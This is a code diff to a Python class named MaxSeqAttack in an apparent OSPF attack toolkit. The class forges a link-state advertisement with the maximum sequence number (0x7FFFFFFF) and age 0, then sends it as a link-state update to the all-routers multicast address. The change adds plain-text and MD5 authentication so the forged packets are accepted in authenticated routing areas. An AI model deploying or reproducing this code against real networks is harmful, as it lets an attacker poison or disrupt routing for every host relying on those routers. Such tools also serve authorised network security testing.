@@ -20,15 +20,19 @@ class MaxSeqAttack(BaseAttack):
     def launch(self) -> AttackResult:
         from ospf_attack.network.adapter import get_local_ip
         src_ip = get_local_ip(self.config.iface)
+        lsid = self.config.link_state_id or self.config.router_id
+        adv = self.config.advertising_router or self.config.router_id
+        auth_type = {"none": 0, "plain": 1, "md5": 2}.get(self.config.auth_type, 0)
+        auth_key = self.config.auth_key.encode() if self.config.auth_key else b""
         lsa = build_lsa_with_body(
             lsa_type=self.config.lsa_type,
-            link_state_id=self.config.link_state_id or self.config.router_id,
-            advertising_router=self.config.advertising_router or self.config.router_id,
+            link_state_id=lsid, advertising_router=adv,
             sequence=0x7FFFFFFF, age=0,
         )
         pkt = build_lsu_packet(
             router_id=self.config.router_id, area_id=self.config.area_id,
             src_ip=src_ip, dst_ip=OSPF_MULTICAST_ALL, lsa_count=1,
+            auth_type=auth_type, auth_key=auth_key,
         )
         pkt = pkt / lsa
         ok = self._sender.send_raw(pkt)
